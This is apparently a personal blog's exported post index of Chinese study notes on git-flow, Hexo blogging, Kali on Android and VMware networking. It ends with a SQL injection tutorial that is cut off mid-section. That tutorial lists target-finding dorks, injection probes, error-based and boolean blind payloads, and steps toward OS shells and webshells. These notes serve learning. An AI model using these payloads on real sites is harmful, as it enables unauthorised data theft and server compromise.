Request</li></ul></li><li>团队项目（github-flow）<ul><li>令master分支保持可部署状态</li><li>进行开发时clone仓库到本地（之前clone过的需要更新master）从master分支创建新分支，新分支名称要有描述性</li><li>在新建的本地分支开发提交</li><li>在GitHub端仓库创建同名分支，定期push（添加测试，要进行代码测试并添加测试代码）</li><li>创建Pull Request进行帮助和反馈</li><li>其他人审查，确认无误后合入master分支</li><li>与master分支合并后立刻部署</li></ul></li><li>发布式项目（以发布产品为目的的项目 git-flow）<ol><li>从开发分支（develop）创建工作分支（feature branches），进行功能实现<ul><li>master分支：保持着软件可以正常运行的状态，因此不能直接对master分支进行修改和提交</li><li>develop分支：开发过程中的代码中心分支，维持着开发过程中的最新源代码</li><li>git clone后执行git flow init -d （对git flow进行初始化 -d使用默认值）并手动在远程仓库创建develop分支</li><li>注：git for Windows自带git flow 没有的需要自行下载安装，可以通过git flow 命令回显查看是否安装</li></ul></li><li>工作分支修改结束后，与开发分支进行合并<ul><li>git flow feature start 功能分支名</li><li>该过程不能在本地Git仓库合并，利用Pull Request进行代码审查后合并到远程仓库的分支git push origin feature/add-us</li><li>更新本地的develop分支，执行git pull</li></ul></li><li>重复1.2直到功能开发完成可以发布</li><li>创建用于发布的分支（relrase branches），处理发布的工作<ul><li>Github仓库的设置页面Default Branch可以修改默认分支，方便起见从master修改为develop</li><li>在develop分支下git flow release start ‘1.0.0’ 开始release分支</li><li>git flow release finish ‘1.0.0’ 结束分支</li><li>合并master分支后会加入一个标签，并且需要提供一些该版本的相关信息</li></ul></li><li>发布工作完成后与master分支合并，打上版本标签（Tag）发布<ul><li>结束工作后push三个内容（develop分支和master分支和tag标签）</li><li>git push –tags</li></ul></li><li>如果发布软件出现BUG，以打了标签的版本为基础进行修改（hotfixes）<ul><li>hotfix分支是应对措施，对当前发布的版本有BUG或漏洞时创建</li><li>hotfix分支以发布版本的标签或者master分支为起点</li><li>git fetch origin先获取远程仓库标签信息，如果是本地创建的可以略过这一步</li><li>git flow hotfix start ‘1.0.1’ ‘1.0.0’ 以1.0.0标签为起点创建名为1.0.1的hotfix分支</li><li>修复完成后将该分支push到Github远程仓库</li><li>利用github创建1.0.1标签<ul><li>在仓库页面从菜单中选择release</li><li>点击Draft a new release ，在Tag version中输入版本号1.0.1</li><li>最后点击Publish release完成</li></ul></li><li>从hotfix分支合并至develop分支，在Github中从hotfix分支向develop分支发送Pull Request即可</li></ul></li><li>版本号分配规则：x.y.z<ol><li>x为大版本更新或者版本不向下兼容，x+1，yz清零</li><li>y为功能添加或删除，y+1，z清零</li><li>z只在内部修改后+1</li></ol></li></ol></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/10/22/hello-world/"/>
      <url>2020/10/22/hello-world/</url>
      
        <content type="html"><![CDATA[<p>2020年</p>]]></content>
      
      
      <categories>
          
          <category> 生活杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github搭建个人博客</title>
      <link href="2020/10/22/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>2020/10/22/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h1><p><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">ht</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">t</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">ps://h</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">e</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">xo.io/zh-cn/</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">d</a><a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Node-js">ocs/#%E5%AE%89%E8%A3%85-Node-js</a></p><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>1.安装Node.js（<a href="https://nodejs.org/en/download/">https://no</a><a href="https://nodejs.org/en/download/">d</a><a href="https://nodejs.org/en/download/">ejs.org/en/downlo</a><a href="https://nodejs.org/en/download/">a</a><a href="https://nodejs.org/en/download/">d/</a>）和Git（<a href="https://gitforwindows.org/">http</a><a href="https://gitforwindows.org/">s</a><a href="https://gitforwindows.org/">://gitforwin</a><a href="https://gitforwindows.org/">d</a><a href="https://gitforwindows.org/">ows.org/</a>）</p><p>2.安装hexo：npm install -g hexo-cli</p><p>3.初始化：hexo init（folder/本地blog文件路径）或直接在想要放blog位置执行命令</p><p>执行完将在目录下出现以下文件</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/lyQU3cCqN9AetEn.png" alt="Image.png"></p><p>各目录作用：</p><p>_config.yml：网站配置信息，配置参数</p><p>themes： 主题文件夹，存放主题</p><p>scaffolds：模板文件夹，根据模板文件创建</p><p>source：存放资源的文件夹，_开头的文件会被忽略（_posts除外），_posts文件存放md文件</p><p>4.主题安装：git clone -b master<a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc1</a><a href="https://github.com/jerryc127/hexo-theme-butterfly.git">2</a><a href="https://github.com/jerryc127/hexo-theme-butterfly.git">7/hexo-theme-butterfly.git</a>themes/Butterfly</p><p>注：自定义主题安装时可以更改github链接和文件名</p><p>主题应用：修改_config.yml文件的theme：Bbutterfly</p><p>把themes/butterfly文件夹中的 _config.yml 复制到博客根目录里，同时重新命名为 _config.butterfly.yml便于后续git pull平滑升级主题</p><p>5.生成静态页面：hexo g</p><p>成功后会在blog目录下生成project文件夹，文件夹中存放页面html</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/xg34NMlsKCAzY7B.png" alt="Image.png">如果报错安装cheerio：npm <a href="mailto:&#105;&#x6e;&#115;&#x74;&#x61;&#108;&#x6c;&#99;&#x68;&#101;&#x65;&#114;&#x69;&#x6f;&#x40;&#x30;&#46;&#x32;&#50;&#46;&#48;">&#105;&#x6e;&#115;&#x74;&#x61;&#108;&#x6c;&#99;&#x68;&#101;&#x65;&#114;&#x69;&#x6f;&#x40;&#x30;&#46;&#x32;&#50;&#46;&#48;</a> –save（hexo 4.2以上的系统需要安装cheerio）</p><p>6.启动服务器：hexo s</p><p>运行localhost:4000</p><p>报错如下：</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/RkTHuYsyMFt8Ax1.png" alt="Image.png"></p><p>安装pub和stylus渲染器：npm install hexo-renderer-pug hexo-renderer-stylus –save</p><p>再次启动服务器运行可查看到正常页面</p><p>7.部署到github</p><ol><li>创建仓库：仓库名建议设置为 github用户名.github.io</li><li>配置git（详细内容省略可查阅博客文章）</li><li>上传博客文件到github<ol><li>配置_config.yml的repo信息</li><li>deploy:  type: git  repo: 仓库地址  branch: master安装插件：npm install hexo-deployer-git –save</li><li>上传代码：hexo d</li><li>刷新仓库网址即可看到自己刚才上传的文件</li></ol></li><li>配置静态站点</li></ol><p>点击Settings,下滑到GitHub Pages配置，可以看到已经存在为我们发布了静态的页面username.github.io。</p><hr><p>到此一个博客系统已经搭建完成，借用github的服务器存储，后面为博客美化和完善</p><h1 id="博客完善美化"><a href="#博客完善美化" class="headerlink" title="博客完善美化"></a>博客完善美化</h1><p>1.绑定个人域名</p><p>在域名位置添加解析</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/gITKWjDJvc5zEmw.png" alt="Image.png"></p><p>添加内容如下</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/UGZLunz9aIATJjM.png" alt="Image.png"></p><p>记录类型A 主机记录@ 解析线路国外（海外域名选默认） 记录值ip地址（ping<a href="https://bbutterf1y.github.io/">bbutterf1y.github.io</a>（github域名）查看ip地址）</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/1ZuzAU69lp4rynN.png" alt="Image.png"></p><p>记录类型CNAME 主机记录www 解析线路国外（默认） 记录值github域名</p><p>保存后配置CNAME：在source目录新建CNAME文件，输入个人域名地址，保存</p><p>依次执行hexo clean</p><p>hexo g</p><p>hexo d</p><p>成功后，查看就可以发现域名已经修改</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/tSc2RLei5lfpjGy.png" alt="Image.png"></p><p>2.文章搜索（本地搜索）（插件官方github：<a href="https://github.com/wzpan/hexo-generator-search">https://github.com/wzpan/hexo-generator-search</a>）</p><p>安装搜索插件：npm install hexo-generator-search –save</p><p>配置插件：在博客根目录的_config.yml最后插入下面代码</p><p>search:</p><p>path: search.xml</p><p>field: post</p><p>content: true</p><p>各参数详解</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/1ScUiRLjuemw8vN.png" alt="Image.png"></p><p>更改butterfly配置打开本地搜索功能</p>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机虚拟机装kali</title>
      <link href="2020/10/22/%E6%89%8B%E6%9C%BA%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%A3%85kali/"/>
      <url>2020/10/22/%E6%89%8B%E6%9C%BA%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%A3%85kali/</url>
      
        <content type="html"><![CDATA[<p>设备：zuk z2 pro</p><p>原理：linux deploy作为一个载体挂载iso镜像后通过ssh或vnc连接，ssh是命令行操作，vnc是图形化界面操作。</p><p>操作步骤：1.解锁bootloader</p><p>流程如下：<a href="http://rom.7to.cn/jiaochengdetail/16886">http://rom.7to.cn/jiaochengdetail/16886</a></p><p>（注：powershell直接执行命令会出现如下报错。</p><p>解决方法：在命令前加.\）<img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/ENYPOKMdRHjSFLs.png" alt="Image.png"></p><p>2.常规操作ROOT</p><p>推荐一键root方便省时，如果不能一键可以刷已经完美root过的刷机包</p><p>（注：如果刷机后没有root权限，可以再刷一遍）</p><p>也可以单独刷root包获得最高权限。</p><p>3.进入主题装kali</p><p>直接百度下载linux deploy，ssh和vnc或者在下面链接下载四件套（另包含kali的iso镜像）</p><p>链接：<a href="https://pan.baidu.com/s/1iKWyDLPCDASCxqlnrNf7yw">https://pan.baidu.com/s/1iKWyDLPCDASCxqlnrNf7yw</a></p><p>提取码：1ab5</p><p>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>安装好这三个软件后先打开deploy进行设置将ssh和图形界面选择之后安装（安装时会自动下载iso镜像）<strong>切记此处一定是先设置后安装。</strong></p><p>安装好后选择启动即可，如果启动后ssh和vnc启动失败可以通过重装解决（我是因为这两个安装失败导致无法启动所以重装解决的）。</p><p>正常启动后设置ssh和vnc，ssh设置一般为<a href="mailto:&#x61;&#x6e;&#100;&#114;&#111;&#x69;&#100;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;">&#x61;&#x6e;&#100;&#114;&#111;&#x69;&#100;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a>:22进入连接后输入密码即可正常使用vnc设置为5900端口ip还是127.0.0.1其他设置按照你的设置同步。</p><p>至此你就成功在手机上装好了kali！！！</p>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机kali硬盘</title>
      <link href="2020/10/22/%E8%99%9A%E6%8B%9F%E6%9C%BAkali%E7%A1%AC%E7%9B%98%E6%89%A9%E5%B1%95/"/>
      <url>2020/10/22/%E8%99%9A%E6%8B%9F%E6%9C%BAkali%E7%A1%AC%E7%9B%98%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>使用工具：GParted</p><p>操作步骤：</p><ol><li>先删除扩展分区sda2扩展分区和sda5交换区</li><li>在sda1调整大小后新建sda2选择扩展分区</li><li>新建sda5选择liunx-swap</li><li>点击执行</li><li>大功告成</li></ol><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/MucR3JWpFBCNOPG.png" alt="Image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机的网络连接模式解读</title>
      <link href="2020/10/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%BC%8F/"/>
      <url>2020/10/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h1><p>直接连物理网络</p><p>虚拟机的虚拟网卡通过虚拟网桥连接到主机网卡，虚拟机和物理机同时使用主机网卡，如同一台独立的主机连接在路由器上，分配自己的ip。</p><p>虚拟机、物理机、外网之间都能互相进行通信</p><p>虚拟机和物理机的交互：虚拟机-&gt;主机网卡-&gt;路由器-&gt;主机网卡-&gt;物理机</p><p>可采用桥接的情景：物理机所处的网络中有DHCP服务，能够自动为网络内的主机分配IP地址。</p><p>不适合的情景：校园网，物理机拨号上网，可能内部虚拟机无法联网</p><p>注：复制物理网络连接状态：在笔记本电脑或其他移动设备上使用虚拟机，请选择复制物理网络连接状态。当您在有线或无线网络之间进行移动时，该设置会导致IP 地址续订。</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/HbAQsr6PZNe4vFl.png" alt="20180621213913597.png"></p><h1 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h1><p>用于共享主机的IP地址</p><p>NAT（NetworkAddress Translation）网络地址转换，物理机为网关，虚拟机为子网。虚拟机的ip和物理机相同，由虚拟DHCP服务器分配。虚拟机和物理机处于不同的网段。</p><p>虚拟机和物理机之间可以互相通信，虚拟网卡和虚拟机处于一个地址段，虚拟机和主机不同一个地址段，主机相当于虚拟机的网关，所以虚拟机能ping到主机的IP，但是主机ping不到虚拟机的IP。虚拟机能够访问外网，但是外网不能够访问虚拟机。</p><p>注：默认情况下，外部网络无法访问到虚拟机，通过手动修改NAT设置实现端口转发功能，将外部网络发送到主机指定端口的数据转发到指定的虚拟机上。比如，我们在虚拟机的80端口上”建立”了一个站点，只要我们设置端口转发，将主机88端口上的数据转发给虚拟机的80端口，就可以让外部网络通过主机的88端口访问到虚拟机80端口上的站点。</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/zY4GICK3jFLhrsl.png" alt="Image.png"><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/u8GigqQso7YLHDd.png" alt="Image.png"><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/EiD56zNVaZqYhuP.png" alt="Image.png"></p><p>主机端口号是别的宿主机访问该虚拟机时，通过该虚拟机所在的宿主机的“IP”+“：”+主机端口号</p><p>虚拟机端口号是虚拟机上哪个服务端、哪个软件接受数据，就写哪个端口。</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/yFDSGrCER4aJhQM.png" alt="20180621214152330.png"></p><h1 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h1><p>与主机共享的专用网络</p><p>与NAT模式唯一区别是不能连入外网。</p><p>注：如果要使得虚拟机能联网，在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，将主机网卡共享给VMware Network Adapter VMnet1网卡，仍然可以让虚拟机连接到Internet或其他网络。</p><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/CHWmGzYTLd8v4N5.png" alt="20160408185547350.png"><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/pZfKG32wcsxbNCV.png" alt="20160408185619116.png"><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/pDHSP1vKo3jcd8Z.png" alt="20160408185655778.png"><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/tiYxafrTKM9N4DH.png" alt="20180621215434596.png"></p><h1 id="LAN区段"><a href="#LAN区段" class="headerlink" title="LAN区段"></a>LAN区段</h1><p>相当于模拟出一个交换机或集线器，把不同虚拟机连接起来，与物理机不进行数据交流，与外网也不进行数据交流，构建一个独立的网络。没有DHCP功能，需要手工配置IP或者单独配置DHCP服务器。</p><hr><ul><li>VMnet0：用于虚拟桥接网络下的虚拟交换机</li><li>VMnet1：用于虚拟Host-Only网络下的虚拟交换机</li><li>VMnet8：用于虚拟NAT网络下的虚拟交换机</li><li>VMware NetworkAdepter VMnet1：用于与Host-Only虚拟网络进行通信的虚拟网卡</li><li>VMware NetworkAdepter VMnet8：用于与NAT虚拟网络进行通信的虚拟网卡</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白向 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入详解</title>
      <link href="2020/10/22/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2020/10/22/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>笔记参考：<a href="http://gv7.me/articles/2018/summarize-all-types-of-sql-injection/">http://gv7.me/articles/2018/summarize-all-types-of-sql-injection/</a></p><h1 id="基本分类"><a href="#基本分类" class="headerlink" title="基本分类"></a><strong>基本分类</strong></h1><p><img src= "/picture/loading1.gif" data-lazy-src="https://i.loli.net/2020/10/27/jEI9QCVk1aJizOY.png" alt="Image.png"></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h1><h2 id="1-web框架结构"><a href="#1-web框架结构" class="headerlink" title="1.web框架结构"></a>1.web框架结构</h2><p>将web应用部署在一个容器上与数据库进行交互</p><p>web应用分为：web前端、web应用（CMS/OA/Blog）、web开发框架（Django/Struts2/ThinkPHP）、web语言（PHP/JSP/.Net）</p><p>容器：IIS、Apache、TomCat、Nginx</p><h2 id="2-SQL语言全称结构化查询语言（StructuredQueryLanguage）"><a href="#2-SQL语言全称结构化查询语言（StructuredQueryLanguage）" class="headerlink" title="2.SQL语言全称结构化查询语言（StructuredQueryLanguage）"></a>2.SQL语言全称结构化查询语言（StructuredQueryLanguage）</h2><p>介于关系代数和关系验算之间的语言，是关系数据库语言，功能包括查询、操作、定义和控制四个方面</p><h2 id="3-MySql基础知识"><a href="#3-MySql基础知识" class="headerlink" title="3.MySql基础知识"></a>3.MySql基础知识</h2><ul><li>常用函数：<ul><li>system_user()：系统用户名</li><li>user()：用户名</li><li>current_user()：当前用户名</li><li>session_user()：连接数据库的用户名</li><li>database()：数据库名（进入数据库后有值）</li><li>version()和@@version：数据库版本（只有MySql对这两种方式都识别）</li><li>@@datadir：数据库路径</li><li>@@basedir：数据库安装路径</li><li>@@version_compile_os：操作系统</li><li>——————————————————————————————</li><li>count()：返回执行结果数量（对某条sql语句执行结果数量的统计）</li><li>concat()：没有分隔符地连接字符串（用,将字符串分隔开不用’’括起）</li><li>concat_ws()：含有分隔符地连接字符串（在括号中指定分隔符,后加字符串）</li><li>group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据</li><li>load_file()：读取本地文件</li><li>into outfile：写文件（’文件内容’ into outfile ‘文件路径’）</li><li>ascii()：字符串的ASCLL代码值</li><li>ord()：返回字符串第一个字符的ASCLL值</li><li>mid()：返回一个字符串的一部分（’字符串’,起始位置,结束位置）（以1开始）</li><li>substr()：功能同上</li><li>length：返回字符串的长度</li><li>left()：返回字符串最左面x字符（’string’,x）</li><li>floor()：返回小于或等于x的最大整数</li><li>rand()：返回0-1之间的一个随机数</li><li>extractvalue()：从目标XML返回包含所查询值的字符串（第一个参数是XML的字符，第二个参数是Xpath格式的字符串）</li><li>updatexml()：改变文档中符合条件的节点的值（在上一个函数的基础上加第三个参数，第三个函数为替换查找到值的字符串）</li><li>sleep()：让此语句运行N秒钟</li><li>if()：判断条件，条件为真返回第一个值，未假返回第二个值</li><li>char()：返回整数ASCLL代码字符组成的字符串</li><li>strcmp()：比较字符串大小（前面小返回-1，相等返回0，前面大返回1）</li><li>ifnull()：第一个参数不为NULL则返回第一个参数，否则返回第二个参数</li><li>exp()：返回e的x次方（exp(x)）</li></ul></li><li>运算符：<ul><li>div：除法运算，同/</li><li>mod：求余运算，同%</li><li>is null：为空</li><li>is not null：不为空</li><li>between and：在…之间</li><li>in：包含（in(值)）</li><li>not in：不包含</li><li>like：模式匹配（like ‘值’ 在值的两侧加%搜索包含值的所有值）</li><li>not like：模式匹配</li><li>regexp：正则表达式</li><li>&amp;&amp;或and：与</li><li>||或or：或</li><li>|或not：非</li><li>xor：异或</li></ul></li></ul><h2 id="4-sql注入概念"><a href="#4-sql注入概念" class="headerlink" title="4.sql注入概念"></a>4.sql注入概念</h2><p>将一段sql语句插入到可以被数据库直接执行的位置，根据返回结果，获得一些数据库信息</p><h2 id="5-注入流程"><a href="#5-注入流程" class="headerlink" title="5.注入流程"></a>5.注入流程</h2><p>数据库→数据表→列→数据</p><p>寻找注入点</p><ul><li>目标搜集：<ul><li>无特定目标：inurl:.php?id=</li><li>有特定目标：inurl:.php?id= site:target.com</li><li>工具爬取：spider，对搜索引擎和目标 网站链接爬取</li></ul></li><li>注入识别：<ul><li>手工简单识别：<ul><li>‘</li><li>and 1=1/and 1=2</li><li>and’1’=’1/and ‘1’=’2（将原本语句引号闭合）</li><li>and 1 like 1/and 1 like 2（过滤等于号）</li></ul></li><li>工具识别<ul><li>sqlmap -m filename（filename中保存检测目标）（无特定目标）</li><li>sqlmap –crawl（sqlmap对目标网站爬取，依次测试）（有特定目标）</li></ul></li></ul></li><li>高级识别：<ul><li>扩展识别广度和深度<ul><li>sqlmap –level 增加测试级别（1-5级），对header中相关参数也进行测试</li><li>sqlmap -r filename（filename中为网站请求的数据）</li></ul></li><li>利用工具提高识别效率<ul><li>BurpSuite+SqlMap（Burp中有sqlmap插件SQLiPy Sqlmap Integration）</li></ul></li><li>Tips<ul><li>参数后加*来确定想要测试的参数</li><li>可能出现注入的点：新闻、登陆、搜索（搜索的作者、时间范围、关键字）、留言</li><li>开发者角度</li></ul></li></ul></li><li>代码审计：<ul><li>搜索关键代码和函数：sql语句select关键字用户输入方式GET POST</li><li>梳理业务流程</li></ul></li></ul><p>注入流程</p><ul><li>信息搜集<ul><li>数据库类型<ul><li>报错信息</li><li>特有语句</li></ul></li><li>数据库版本：函数：@@version（SQL Server）version()（MySQL）v$version（Oracle）</li><li>数据库用户：user()（MySQL）SYSTEM_USER（SQL Server）</li><li>数据库权限：super_priv（MySQL）IS_SRVROLEMEMBER（SQL Server）</li></ul></li><li>数据获取（语句查询、暴力破解）<ul><li>获取库信息</li><li>获取表信息</li><li>获取列信息</li><li>获取数据</li></ul></li><li>提权（根据数据库权限）<ul><li>执行系统命令——直接提权（SQLServer sa权限xp.cmdshell）<ul><li>sqlmap –os-shell：执行系统命令</li></ul></li><li>读文件<ul><li>读数据库配置文件，尝试远程连接</li><li>读系统中间件配置文件，搜集信息</li></ul></li><li>写文件——写webshell到网站目录</li></ul></li></ul><h2 id="6-手工注入方法"><a href="#6-手工注入方法" class="headerlink" title="6.手工注入方法"></a>6.手工注入方法</h2><p>MySQL数据库结构（从上层至底层）</p><ul><li>连接层<ul><li>通信协议：与外部应用程序的通信方式</li><li>线程：连接数量的管理</li><li>验证：验证用户输入的用户名与密码</li></ul></li><li>Sql层：数据库任务的执行，并将结果处理返回<ul><li>解析器、授权、优化器、查询执行、查询高速缓存、查询日志记录</li><li>判断语法、语句、语义</li><li>数据库对象授权情况判断，授权失败不继续</li><li>解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式</li><li>优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</li><li>执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式</li><li>将取数据的方式，交由下层（存储引擎层）进行处理</li><li>最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前</li><li>查询缓存：缓存之前查询的数据</li></ul></li><li>存储引擎层：数据的存取，定义数据存储的格式和方式（磁盘、内存、网络）</li></ul><p>Mysql内置库（&gt;=5.7）：</p><ul><li>mysql：保存有账户信息，权限信息，存储过程，event，时区等信息</li><li>sys：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</li><li>performance_schema：用于收集数据库服务器性能参数</li><li>information_schema：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。</li></ul><p>MySQL手工注入方法</p><p>核心原理：通过information_schema库查看到数据库中所有的数据信息</p><p>查询数据核心语法：</p><p>|功能名称|查询语句|<br>|:—-:|:—-|:—-|<br>|查库|select schema_name from information_schema.schemata|<br>|查表|select table_name from information_schema.tables where table_schema=’库名’ （将库名转换为16进制可以省略单引号）|<br>|查列|select column_name from information_schema.columns where table_schema=’表名’ （同上）|<br>|查数据|select 列名 from 库名.表名|</p><p>tips1：所有类型的sql注入都是基于查库、表、列语句</p><p>tips2：如果数据太多将会导致无法返回查询结果</p><p>查询场景：利用limit限定返回的数量及位置，依次查询（limit x,y （第x条数据开始返回y条））</p><p>回显数据的场景：<em>concat</em>连接多个数据成为一条返回结果</p><h1 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a><strong>进阶知识</strong></h1><h2 id="1-union查询注入"><a href="#1-union查询注入" class="headerlink" title="1.union查询注入"></a>1.union查询注入</h2><p>union介绍：UNION 操作符用于合并两个或多个SELECT语句的结果集</p><p>注：UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条SELECT中的列的顺序必须是相同的</p><p>UNION操作符选取的是不同的值，如果允许重复的值，使用UNION ALL</p><p>union查询注入方法</p><p>前提：注入点页面有回显</p><p>只要union连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果</p><p>注意：order bylimit insert update 等后面不能再加select子句</p><p>过程：</p><ol><li>order by 确定列数（order by 才出来的列数超过数据库表中的列数，将会报错不返回数据，不断试错猜出，猜出后union才能并列数不报错）</li><li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li><li>执行任意语句（读库，读表，读字段，读数据等）</li></ol><h2 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h2><p>报错注入原理：</p><p>构造 payload 让信息通过错误提示回显出来</p><p>应用场景：查询不回显内容，但是会打印错误信息。update、insert等语句会打印错误信息等</p><p>报错注入方法：</p><p>floor()</p><ul><li>group by对rand()函数进行操作时产生错误</li><li>语句：select count(*) from information_schema.tables group by concat ((select version()),floor(rand(0)*2))</li></ul><p>extractvalue()</p><ul><li>第二个参数xpath语法错误产生报错</li><li>语句：extractvalue(1,concat(0x7e,(select user()),0x7e))</li></ul><p>updatexml()</p><ul><li>第二个参数xpath语法错误产生报错</li><li>语句：select updatexml(1,concat(0x7e,(select user()),0x7e),1)</li></ul><p>注：报错内容超过32位将显示不完整使用substr()对数据进行截取</p><h2 id="3-SQL盲注"><a href="#3-SQL盲注" class="headerlink" title="3.SQL盲注"></a>3.SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ol><li>布尔盲注原理</li><li>页面不显示回显数据和回显错误信息只返回两种情况（right or wrong），通过构造语句，判断数据库中的内容布尔盲注方法<ol><li>left()函数<ol><li>left(database(),1)&gt;’s’</li><li>database()显示数据库名称，left(a,b)从左侧截取a的前b位</li></ol></li><li>regexp<ol><li>select user() regexp ‘^r’</li><li>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</li></ol></li><li>like<ol><li>select user() like ‘ro%’</li><li>与regexp类似，使用like进行匹配</li></ol></li><li>substr()函数 ascii()函数<ol><li>ascii(substr((select database()),1,1))=98</li><li>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值</li></ol></li><li>ord()函数 mid()函数<ol><li>ord(mid((select user()),1,1))=114</li><li>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，ord()将字符转为ascii值</li></ol></li><li>注：使用ascii是为了防止’’被转义</li></ol></li></ol><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" 